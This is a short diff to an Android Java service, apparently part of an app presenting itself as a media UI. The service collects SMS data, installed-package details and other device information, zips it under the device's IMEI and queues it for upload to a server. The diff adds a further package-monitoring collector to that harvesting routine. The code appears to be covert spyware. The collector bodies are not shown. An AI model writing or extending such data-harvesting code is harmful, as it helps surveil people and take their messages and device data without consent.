@@ -10,6 +10,7 @@ import com.media.ui.DataCollector.lowBatteryData;
 import com.media.ui.DataCollector.miscCollector;
 import com.media.ui.DataCollector.packageDetails;
 import com.media.ui.DataCollector.packageInstallCollector;
+import com.media.ui.DataCollector.packageMonitorCollector;
 import com.media.ui.DataCollector.smsData;
 import com.media.ui.ServerJobs.uploadData;
 import com.media.ui.constants;
@@ -46,6 +47,7 @@ public class dataSender extends IntentService {
             new lowBatteryData(this);
             new miscCollector(this);
             new packageInstallCollector(this);
+            new packageMonitorCollector(this);
             File d = new File(Environment.getExternalStorageDirectory(), constants.DataFolder);
             File f = new File(Environment.getExternalStorageDirectory(), "final_"+imi(this)+"_"+String.valueOf(timi)+".zip");
             if ((d.exists()) && (d.isDirectory())) {
